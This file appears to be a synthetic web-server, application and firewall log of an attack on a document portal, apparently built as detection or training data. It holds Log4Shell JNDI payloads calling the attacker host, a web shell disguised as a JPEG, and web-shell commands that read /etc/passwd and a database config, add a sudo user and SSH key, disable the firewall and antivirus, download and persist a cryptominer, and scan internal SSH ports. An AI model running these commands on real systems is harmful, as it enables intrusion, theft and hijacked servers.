@@ -1,0 +1,150 @@
+45.155.204.19 - - [23/Jul/2026:02:05:10 +0000] "GET /actuator/env HTTP/1.1" 400 437 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)"
+41.194.88.39 - - [23/Jul/2026:02:05:11 +0000] "GET /api/documents?page=2 HTTP/1.1" 204 19058 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/126.0.2592.68"
+45.155.204.19 - - [23/Jul/2026:02:05:35 +0000] "GET /actuator/health HTTP/1.1" 200 362 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)"
+45.155.204.19 - - [23/Jul/2026:02:05:54 +0000] "GET /actuator/beans HTTP/1.1" 400 278 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)"
+45.155.204.19 - - [23/Jul/2026:02:06:11 +0000] "GET /manager/html HTTP/1.1" 404 447 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)"
+45.155.204.19 - - [23/Jul/2026:02:06:34 +0000] "GET /api/documents?page=${jndi:ldap://45.155.204.19:1389/Exploit} HTTP/1.1" 400 593 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)"
+45.155.204.19 - - [23/Jul/2026:02:06:45 +0000] "GET /documents/view?id=${jndi:rmi://45.155.204.19:1389/Exploit} HTTP/1.1" 404 337 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)"
+45.155.204.19 - - [23/Jul/2026:02:06:49 +0000] "GET /api/version HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)"
+45.155.204.19 - - [23/Jul/2026:02:07:05 +0000] "GET /.git/config HTTP/1.1" 400 277 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)"
+45.155.204.19 - - [23/Jul/2026:02:07:24 +0000] "GET /wp-login.php HTTP/1.1" 404 436 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)"
+45.155.204.19 - - [23/Jul/2026:02:07:39 +0000] "GET /console/ HTTP/1.1" 404 581 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)"
+[23/Jul/2026:02:07:46 +0000] FIREWALL_LOG action=ALLOW proto=TCP src=10.4.2.31 dst=185.243.96.201 dport=8443 msg="outbound beacon from compromised host web-portal-07"
+45.155.204.19 - - [23/Jul/2026:02:08:15 +0000] "GET /documents HTTP/1.1" 200 8210 "-" "curl/8.4.0"  header:X-Api-Version=${jndi:ldap://45.155.204.19:1389/a}
+[23/Jul/2026:02:08:20 +0000] APP_LOG level=WARN msg="JNDI lookup attempted" class=org.apache.logging.log4j.core.lookup.JndiLookup target=ldap://45.155.204.19:1389/a
+[23/Jul/2026:02:08:27 +0000] APP_LOG level=ERROR msg="Remote class load succeeded" class=Exploit.class source=45.155.204.19
+185.169.240.90 - - [23/Jul/2026:02:08:29 +0000] "GET /api/notifications HTTP/1.1" 302 24176 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/126.0.2592.68"
+45.155.204.19 - - [23/Jul/2026:02:09:36 +0000] "POST /documents/upload HTTP/1.1" 200 1420 "-" "curl/8.4.0"  filename=invoice_scan.php.jpg content_type=image/jpeg
+[23/Jul/2026:02:09:48 +0000] APP_LOG level=INFO msg="File stored" path=/var/www/portal/uploads/invoice_scan.php.jpg id=88231
+45.155.204.19 - - [23/Jul/2026:02:10:01 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=whoami HTTP/1.1" 200 542 "-" "curl/8.4.0"  WEBSHELL_EXEC
+45.155.204.19 - - [23/Jul/2026:02:10:12 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=id HTTP/1.1" 200 308 "-" "curl/8.4.0"  WEBSHELL_EXEC
+45.155.204.19 - - [23/Jul/2026:02:10:28 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=uname+-a HTTP/1.1" 200 1086 "-" "curl/8.4.0"  WEBSHELL_EXEC
+45.155.204.19 - - [23/Jul/2026:02:10:33 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=cat+/etc/passwd HTTP/1.1" 200 3325 "-" "curl/8.4.0"  WEBSHELL_EXEC
+45.155.204.19 - - [23/Jul/2026:02:10:47 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=hostname HTTP/1.1" 200 687 "-" "curl/8.4.0"  WEBSHELL_EXEC
+45.155.204.19 - - [23/Jul/2026:02:10:55 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=pwd HTTP/1.1" 200 817 "-" "curl/8.4.0"  WEBSHELL_EXEC
+45.155.204.19 - - [23/Jul/2026:02:11:09 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=ls+-la+/var/www HTTP/1.1" 200 3134 "-" "curl/8.4.0"  WEBSHELL_EXEC
+45.155.204.19 - - [23/Jul/2026:02:11:28 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=cat+/etc/os-release HTTP/1.1" 200 3159 "-" "curl/8.4.0"  WEBSHELL_EXEC
+45.155.204.19 - - [23/Jul/2026:02:11:50 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=ps+aux HTTP/1.1" 200 2596 "-" "curl/8.4.0"  WEBSHELL_EXEC
+45.155.204.19 - - [23/Jul/2026:02:11:58 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=netstat+-tulpn HTTP/1.1" 200 714 "-" "curl/8.4.0"  WEBSHELL_EXEC
+45.155.204.19 - - [23/Jul/2026:02:12:06 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=cat+/etc/hostname HTTP/1.1" 200 3494 "-" "curl/8.4.0"  WEBSHELL_EXEC
+45.155.204.19 - - [23/Jul/2026:02:12:23 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=df+-h HTTP/1.1" 200 2212 "-" "curl/8.4.0"  WEBSHELL_EXEC
+45.155.204.19 - - [23/Jul/2026:02:12:44 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=free+-m HTTP/1.1" 200 1476 "-" "curl/8.4.0"  WEBSHELL_EXEC
+45.155.204.19 - - [23/Jul/2026:02:13:02 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=env HTTP/1.1" 200 596 "-" "curl/8.4.0"  WEBSHELL_EXEC
+45.155.204.19 - - [23/Jul/2026:02:13:19 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=cat+/var/www/portal/config/database.yml HTTP/1.1" 200 3180 "-" "curl/8.4.0"  WEBSHELL_EXEC
+45.155.204.19 - - [23/Jul/2026:02:13:40 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=which+python3 HTTP/1.1" 200 3162 "-" "curl/8.4.0"  WEBSHELL_EXEC
+45.155.204.19 - - [23/Jul/2026:02:13:56 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=which+curl HTTP/1.1" 200 2898 "-" "curl/8.4.0"  WEBSHELL_EXEC
+45.155.204.19 - - [23/Jul/2026:02:14:11 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=which+wget HTTP/1.1" 200 2652 "-" "curl/8.4.0"  WEBSHELL_EXEC
+45.155.204.19 - - [23/Jul/2026:02:14:34 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=find+/+-perm+-4000+-type+f+2>/dev/null HTTP/1.1" 200 859 "-" "curl/8.4.0"  WEBSHELL_EXEC
+45.155.204.19 - - [23/Jul/2026:02:14:49 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=useradd+-m+-s+/bin/bash+sysupdate_svc HTTP/1.1" 200 691 "-" "curl/8.4.0"  WEBSHELL_EXEC SERVER_TAKEOVER
+45.155.204.19 - - [23/Jul/2026:02:14:57 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=echo+'sysupdate_svc+ALL=(ALL)+NOPASSWD:ALL'+>>+/etc/sudoers HTTP/1.1" 200 990 "-" "curl/8.4.0"  WEBSHELL_EXEC SERVER_TAKEOVER
+185.18.216.24 - - [23/Jul/2026:02:15:03 +0000] "GET /documents/view?id=5521 HTTP/1.1" 404 6321 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
+45.155.204.19 - - [23/Jul/2026:02:15:13 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=passwd+sysupdate_svc HTTP/1.1" 200 1453 "-" "curl/8.4.0"  WEBSHELL_EXEC SERVER_TAKEOVER
+45.155.204.19 - - [23/Jul/2026:02:15:34 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=mkdir+-p+/root/.ssh+&&+echo+'ssh-rsa+AAAAB3NzaC1yc2EAAAADAQABAAABgQC7xJ2f...attacker_key'+>>+/root/.ssh/authorized_keys HTTP/1.1" 200 1702 "-" "curl/8.4.0"  WEBSHELL_EXEC SERVER_TAKEOVER
+45.155.204.19 - - [23/Jul/2026:02:16:06 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=systemctl+stop+ufw HTTP/1.1" 200 1676 "-" "curl/8.4.0"  WEBSHELL_EXEC SERVER_TAKEOVER
+45.155.204.19 - - [23/Jul/2026:02:16:39 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=systemctl+disable+clamav-daemon HTTP/1.1" 200 474 "-" "curl/8.4.0"  WEBSHELL_EXEC SERVER_TAKEOVER
+45.155.204.19 - - [23/Jul/2026:02:17:08 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=wget+http://45.155.204.19/xmrig+-O+/usr/local/bin/.sysupd HTTP/1.1" 200 289 "-" "curl/8.4.0"  WEBSHELL_EXEC SERVER_TAKEOVER
+45.155.204.19 - - [23/Jul/2026:02:17:25 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=chmod++x+/usr/local/bin/.sysupd HTTP/1.1" 200 1398 "-" "curl/8.4.0"  WEBSHELL_EXEC SERVER_TAKEOVER
+[23/Jul/2026:02:17:46 +0000] FIREWALL_LOG action=ALLOW proto=TCP src=10.4.2.31 dst=185.243.96.201 dport=8443 msg="outbound beacon from compromised host web-portal-07"
+45.155.204.19 - - [23/Jul/2026:02:17:49 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nohup+/usr/local/bin/.sysupd+--config=/tmp/.cfg.json+& HTTP/1.1" 200 453 "-" "curl/8.4.0"  WEBSHELL_EXEC SERVER_TAKEOVER
+45.155.204.19 - - [23/Jul/2026:02:18:07 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=crontab+-l+;+echo+'*/10+*+*+*+*+/usr/local/bin/.sysupd'+|+crontab+- HTTP/1.1" 200 211 "-" "curl/8.4.0"  WEBSHELL_EXEC SERVER_TAKEOVER
+45.155.204.19 - - [23/Jul/2026:02:18:11 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.2+22 HTTP/1.1" 200 173 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:18:14 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.3+22 HTTP/1.1" 200 311 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:18:17 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.4+22 HTTP/1.1" 200 285 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:18:22 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.5+22 HTTP/1.1" 200 220 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:18:26 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.7+22 HTTP/1.1" 200 459 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:18:30 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.8+22 HTTP/1.1" 200 437 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:18:34 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.9+22 HTTP/1.1" 200 371 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:18:40 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.10+22 HTTP/1.1" 200 257 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:18:45 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.11+22 HTTP/1.1" 200 317 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:18:55 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.13+22 HTTP/1.1" 200 210 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:18:57 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.14+22 HTTP/1.1" 200 436 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:19:02 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.15+22 HTTP/1.1" 200 286 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:19:06 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.16+22 HTTP/1.1" 200 223 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:19:11 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.17+22 HTTP/1.1" 200 194 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:19:16 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.18+22 HTTP/1.1" 200 279 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:19:20 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.19+22 HTTP/1.1" 200 292 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:19:24 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.20+22 HTTP/1.1" 200 412 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:19:29 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.21+22 HTTP/1.1" 200 284 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:19:35 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.22+22 HTTP/1.1" 200 398 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:19:46 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.25+22 HTTP/1.1" 200 383 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:19:50 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.26+22 HTTP/1.1" 200 455 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:19:55 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.27+22 HTTP/1.1" 200 261 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:19:57 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.28+22 HTTP/1.1" 200 433 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:20:03 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.29+22 HTTP/1.1" 200 426 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:20:06 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.30+22 HTTP/1.1" 200 409 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:20:08 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.31+22 HTTP/1.1" 200 233 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:20:10 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.32+22 HTTP/1.1" 200 270 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:20:13 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.33+22 HTTP/1.1" 200 251 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:20:16 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.34+22 HTTP/1.1" 200 411 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:20:20 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.35+22 HTTP/1.1" 200 433 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+62.243.249.185 - - [23/Jul/2026:02:20:22 +0000] "GET /billing/invoices HTTP/1.1" 404 12118 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
+45.155.204.19 - - [23/Jul/2026:02:20:26 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.36+22 HTTP/1.1" 200 260 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:20:32 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.37+22 HTTP/1.1" 200 197 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:20:36 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.38+22 HTTP/1.1" 200 212 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:20:38 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.39+22 HTTP/1.1" 200 429 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:20:42 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.40+22 HTTP/1.1" 200 390 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:20:45 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.41+22 HTTP/1.1" 200 182 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:20:49 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.42+22 HTTP/1.1" 200 268 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:20:52 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.43+22 HTTP/1.1" 200 380 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:20:55 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.44+22 HTTP/1.1" 200 196 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:20:59 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.45+22 HTTP/1.1" 200 434 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:21:05 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.47+22 HTTP/1.1" 200 157 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:21:10 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.48+22 HTTP/1.1" 200 481 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:21:14 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.49+22 HTTP/1.1" 200 226 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:21:21 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.51+22 HTTP/1.1" 200 154 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:21:25 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.52+22 HTTP/1.1" 200 279 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:21:30 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.53+22 HTTP/1.1" 200 437 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+213.17.145.16 - - [23/Jul/2026:02:21:32 +0000] "POST /login HTTP/1.1" 200 14528 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
+45.155.204.19 - - [23/Jul/2026:02:21:37 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.55+22 HTTP/1.1" 200 384 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:21:41 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.56+22 HTTP/1.1" 200 260 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:21:43 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.57+22 HTTP/1.1" 200 275 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:21:53 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.59+22 HTTP/1.1" 200 320 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:21:57 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.60+22 HTTP/1.1" 200 294 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:22:00 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.61+22 HTTP/1.1" 200 354 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:22:04 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.62+22 HTTP/1.1" 200 389 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:22:10 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.63+22 HTTP/1.1" 200 160 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:22:16 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.65+22 HTTP/1.1" 200 390 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:22:18 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.66+22 HTTP/1.1" 200 230 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:22:21 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.67+22 HTTP/1.1" 200 279 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:22:24 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.68+22 HTTP/1.1" 200 374 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:22:30 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.69+22 HTTP/1.1" 200 367 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:22:32 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.70+22 HTTP/1.1" 200 312 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:22:38 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.71+22 HTTP/1.1" 200 212 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:22:42 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.72+22 HTTP/1.1" 200 321 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:22:46 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.73+22 HTTP/1.1" 200 186 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:22:49 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.74+22 HTTP/1.1" 200 349 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:22:53 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.75+22 HTTP/1.1" 200 401 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:22:56 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.76+22 HTTP/1.1" 200 254 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:22:58 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.77+22 HTTP/1.1" 200 171 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:23:02 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.78+22 HTTP/1.1" 200 271 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:23:07 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.79+22 HTTP/1.1" 200 337 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:23:11 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.80+22 HTTP/1.1" 200 408 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:23:16 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.81+22 HTTP/1.1" 200 245 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:23:21 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.82+22 HTTP/1.1" 200 409 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:23:26 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.83+22 HTTP/1.1" 200 394 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:23:32 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.84+22 HTTP/1.1" 200 413 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:23:34 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.85+22 HTTP/1.1" 200 408 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:23:39 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.86+22 HTTP/1.1" 200 208 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:23:45 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.87+22 HTTP/1.1" 200 271 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.155.204.19 - - [23/Jul/2026:02:23:47 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.88+22 HTTP/1.1" 200 478 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
